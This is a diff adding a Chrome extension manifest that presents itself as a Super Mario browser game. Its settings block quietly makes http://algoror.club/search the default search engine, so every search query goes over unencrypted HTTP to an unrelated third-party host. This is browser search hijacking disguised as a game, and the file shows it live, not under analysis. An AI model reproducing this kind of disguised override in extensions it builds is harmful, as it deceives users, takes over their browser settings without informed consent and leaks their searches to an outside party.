@@ -1,0 +1,31 @@
+{
+  "icons": {
+    "128": "icon.png"
+  },
+  "description": "Super Mario Game - Play The Famous Super Mario Bros Game Directly From Your Chrome!",
+  "manifest_version": 2,
+  "version": "1.1.11",
+
+  "chrome_settings_overrides": {
+    "search_provider": {
+
+      "keyword": "mario",
+      "search_url": "http://algoror.club/search?q={searchTerms}&type=mario",
+      "encoding": "UTF-8",
+      "is_default": true,
+       "name": "mario",
+      "favicon_url": "http://algoror.club/icon.ico"
+    }
+  },
+
+
+  "name": "Super Mario",
+  "update_url": "https://clients2.google.com/service/update2/crx",
+  
+  "browser_action": {
+    "default_icon": "icon.png",
+    "default_popup": "index.html",
+    "default_title": "Super-Mario-game"
+  }
+
+}
